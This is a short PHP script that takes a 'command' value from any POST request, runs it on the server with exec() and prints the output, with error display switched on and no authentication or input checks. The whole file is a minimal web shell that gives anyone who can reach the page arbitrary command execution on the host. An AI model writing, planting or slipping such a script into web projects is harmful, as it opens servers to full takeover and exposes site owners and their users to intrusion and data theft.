<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $command = $_POST['command'];
    $output = exec($command);
    echo "<h2>Output:</h2>";
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>
